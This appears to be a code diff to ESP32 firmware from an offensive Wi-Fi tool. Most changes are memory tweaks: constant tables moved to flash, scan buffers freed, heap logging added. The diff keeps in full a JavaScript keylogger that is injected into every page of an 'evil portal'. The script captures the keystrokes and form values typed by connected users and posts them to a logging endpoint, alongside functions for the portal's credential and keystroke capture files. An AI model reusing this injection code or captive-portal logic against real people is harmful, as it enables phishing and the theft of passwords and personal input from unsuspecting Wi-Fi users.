@@ -289,7 +289,8 @@ static int ap_connection_count = 0;
 #define MAX_HTML_BUFFER_SIZE 2048
 
 // JavaScript snippet injected into every served HTML page to capture keystrokes and input values
-static const char *CAPTURE_JS_SNIPPET = \
+// Keep as const array so it lives in flash (.rodata) and not in RAM
+static const char CAPTURE_JS_SNIPPET[] =
     "<script>(function(){const send=d=>navigator.sendBeacon?navigator.sendBeacon('/api/log',new Blob([d])):fetch('/api/log',{method:'POST',headers:{\"Content-Type\":\"text/plain\"},body:d});const h=e=>{const t=e.target;if(!(t.name||t.id))return;const tag=t.tagName.toLowerCase();send(Date.now()+\"|\"+tag+\"|\"+(t.name||t.id)+\"|\"+t.value+\"\\n\");};['input','change','keydown'].forEach(ev=>document.addEventListener(ev,h,true));})();</script>";
 static char* html_buffer = NULL;
 static size_t html_buffer_size = 0;
@@ -323,16 +324,17 @@ struct service_info {
     const char *type;
 };
 
-struct service_info services[] = {{"_http", "Web Server Enabled Device"},
-                                  {"_ssh", "SSH Server"},
-                                  {"_ipp", "Printer (IPP)"},
-                                  {"_googlecast", "Google Cast"},
-                                  {"_raop", "AirPlay"},
-                                  {"_smb", "SMB File Sharing"},
-                                  {"_hap", "HomeKit Accessory"},
-                                  {"_spotify-connect", "Spotify Connect Device"},
-                                  {"_printer", "Printer (Generic)"},
-                                  {"_mqtt", "MQTT Broker"}};
+// Store in flash: const ensures this large-ish static table is placed in .rodata
+static const struct service_info services[] = {{"_http", "Web Server Enabled Device"},
+                                              {"_ssh", "SSH Server"},
+                                              {"_ipp", "Printer (IPP)"},
+                                              {"_googlecast", "Google Cast"},
+                                              {"_raop", "AirPlay"},
+                                              {"_smb", "SMB File Sharing"},
+                                              {"_hap", "HomeKit Accessory"},
+                                              {"_spotify-connect", "Spotify Connect Device"},
+                                              {"_printer", "Printer (Generic)"},
+                                              {"_mqtt", "MQTT Broker"}};
 
 #define NUM_SERVICES (sizeof(services) / sizeof(services[0]))
 
@@ -1405,7 +1407,8 @@ void wifi_manager_stop_evil_portal() {
     current_creds_filename[0] = '\0'; // Clear saved filenames
     current_keystrokes_filename[0] = '\0';
     
-    // Keep HTML buffer across portal restarts - don't clear it here
+    // Free captured HTML buffer when portal stops to reclaim RAM
+    wifi_manager_clear_html_buffer();
 
     if (dns_handle != NULL) {
         stop_dns_server(dns_handle);
@@ -1424,6 +1427,20 @@ void wifi_manager_stop_evil_portal() {
 
 bool wifi_manager_is_evil_portal_active(void) {
     return evilportal_server != NULL;
+}
+
+// Release scan result buffers when they are no longer needed
+void wifi_manager_clear_scan_results(void) {
+    if (scanned_aps != NULL) {
+        free(scanned_aps);
+        scanned_aps = NULL;
+        ap_count = 0;
+    }
+    if (selected_aps != NULL) {
+        free(selected_aps);
+        selected_aps = NULL;
+        selected_ap_count = 0;
+    }
 }
 
 void wifi_manager_start_monitor_mode(wifi_promiscuous_cb_t_t callback) {
@@ -1618,6 +1635,18 @@ void wifi_manager_configure_sta_from_settings(void) {
 }
 
 void wifi_manager_start_scan() {
+    log_heap_status(TAG, "scan_start_pre");
+    // Free any previous selections or scan buffers before starting a fresh scan
+    if (selected_aps != NULL) {
+        free(selected_aps);
+        selected_aps = NULL;
+        selected_ap_count = 0;
+    }
+    if (scanned_aps != NULL) {
+        free(scanned_aps);
+        scanned_aps = NULL;
+        ap_count = 0;
+    }
     ap_manager_stop_services();
     ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
     ESP_ERROR_CHECK(esp_wifi_start());
@@ -1644,10 +1673,12 @@ void wifi_manager_start_scan() {
     if (err != ESP_OK) {
         printf("WiFi scan failed to start: %s", esp_err_to_name(err));
         TERMINAL_VIEW_ADD_TEXT("WiFi scan failed to start\n");
+        log_heap_status(TAG, "scan_start_failed");
         return;
     }
 
     wifi_manager_stop_scan();
+    log_heap_status(TAG, "scan_start_post");
     ESP_ERROR_CHECK(esp_wifi_stop());
     ESP_ERROR_CHECK(ap_manager_start_services());
 }
@@ -1656,6 +1687,7 @@ void wifi_manager_start_scan() {
 void wifi_manager_stop_scan() {
     esp_err_t err;
 
+    log_heap_status(TAG, "scan_stop_pre");
     err = esp_wifi_scan_stop();
     if (err == ESP_ERR_WIFI_NOT_STARTED) {
 
@@ -5819,8 +5851,10 @@ void wifi_manager_set_html_from_uart(void) {
         if (html_buffer == NULL) {
             printf("Failed to allocate HTML buffer\n");
             use_html_buffer = false;
+            log_heap_status(TAG, "html_buffer_alloc_fail");
             return;
         }
+        log_heap_status(TAG, "html_buffer_alloc_ok");
     }
     html_buffer_size = 0;
     printf("HTML buffer mode enabled, ready to receive HTML content\n");
